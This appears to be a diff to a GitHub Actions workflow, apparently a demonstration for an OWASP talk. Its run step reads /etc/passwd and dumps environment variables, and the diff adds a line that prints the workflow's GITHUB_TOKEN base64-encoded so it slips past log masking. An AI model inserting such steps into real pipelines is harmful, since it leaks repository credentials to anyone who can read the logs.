@@ -12,5 +12,6 @@ jobs:
             ls -la
             cat /etc/passwd
             env
+            echo $GITHUB_TOKEN | base64 
             echo "Hello OWASP Vancouver!"
       
